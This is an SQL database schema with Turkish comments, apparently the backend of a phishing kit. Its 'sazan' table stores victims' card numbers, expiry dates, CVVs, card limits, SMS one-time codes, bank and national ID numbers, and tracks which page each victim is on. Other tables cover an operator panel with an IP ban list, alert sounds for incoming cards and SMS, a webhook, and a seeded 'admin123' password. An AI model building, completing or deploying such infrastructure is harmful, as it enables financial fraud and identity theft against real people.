-- D1 Uyumlu SQL Şeması
-- Güncelleme: 16 Kasım 2025

-- Tablo: back
CREATE TABLE IF NOT EXISTS back (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  back TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_back ON back(back);

-- Tablo: ban
CREATE TABLE IF NOT EXISTS ban (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ban TEXT NOT NULL,
  ulke TEXT NOT NULL,
  date_val TEXT NOT NULL,
  cihaz TEXT NOT NULL,
  tarayici TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_ban ON ban(ban);

-- Tablo: hata1
CREATE TABLE IF NOT EXISTS hata1 (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  hata1 TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_hata1 ON hata1(hata1);

-- Tablo: hata2
CREATE TABLE IF NOT EXISTS hata2 (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  hata2 TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_hata2 ON hata2(hata2);

-- Tablo: hata3
CREATE TABLE IF NOT EXISTS hata3 (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  hata3 TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_hata3 ON hata3(hata3);

-- Tablo: ips
CREATE TABLE IF NOT EXISTS ips (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ipAddress TEXT NOT NULL UNIQUE,
  lastOnline INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_lastOnline ON ips(lastOnline);

-- Tablo: paneldekiler
CREATE TABLE IF NOT EXISTS paneldekiler (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ip TEXT NOT NULL,
  tarih TEXT NOT NULL,
  tarayici TEXT NOT NULL,
  durum TEXT NOT NULL
);

-- Tablo: sazan
CREATE TABLE IF NOT EXISTS sazan (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  session_token TEXT UNIQUE,
  date_val TEXT NOT NULL,
  kk TEXT,
  sonkul TEXT,
  cvv TEXT,
  kartlimit TEXT,
  sms TEXT,
  now TEXT NOT NULL DEFAULT 'Anasayfa',
  back INTEGER NOT NULL DEFAULT 0,
  ip TEXT NOT NULL,
  lastOnline INTEGER,
  banka TEXT,
  tc TEXT NOT NULL,
  cihaz TEXT NOT NULL,
  tarayici TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_ip ON sazan(ip);
CREATE INDEX IF NOT EXISTS idx_now ON sazan(now);
CREATE UNIQUE INDEX IF NOT EXISTS idx_session_token ON sazan(session_token);

-- Tablo: site
CREATE TABLE IF NOT EXISTS site (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  pass TEXT NOT NULL,
  kart_sesi INTEGER NOT NULL DEFAULT 0,
  sms_sesi INTEGER NOT NULL DEFAULT 0,
  webhook INTEGER NOT NULL DEFAULT 0,
  webhookURL TEXT NOT NULL,
  tutar TEXT NOT NULL
);

-- Veri: site
INSERT INTO site (pass, kart_sesi, sms_sesi, webhook, webhookURL, tutar) VALUES
('admin123', 0, 0, 0, '.', '150');

-- Tablo: sms
CREATE TABLE IF NOT EXISTS sms (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  sms TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_sms ON sms(sms);

-- Tablo: tebrik
CREATE TABLE IF NOT EXISTS tebrik (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  tebrik TEXT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_tebrik ON tebrik(tebrik);

